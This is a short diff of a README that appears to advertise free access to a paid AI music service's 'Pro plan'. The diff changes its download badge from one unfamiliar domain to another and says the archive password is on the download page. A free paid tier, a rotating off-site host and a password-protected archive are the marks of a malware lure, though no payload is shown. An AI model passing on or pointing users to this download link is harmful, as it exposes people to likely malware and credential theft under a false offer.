@@ -18,7 +18,7 @@ Access Udio AI Pro plan for free. Generate unlimited AI music tracks, extend son
 
 ## Download
 
-[![Download v1.1.0](https://img.shields.io/badge/Download_v1.1.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/udioai)
+[![Download v1.1.0](https://img.shields.io/badge/Download_v1.1.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/udioai)
 
 > The archive password is shown on the download page.
 
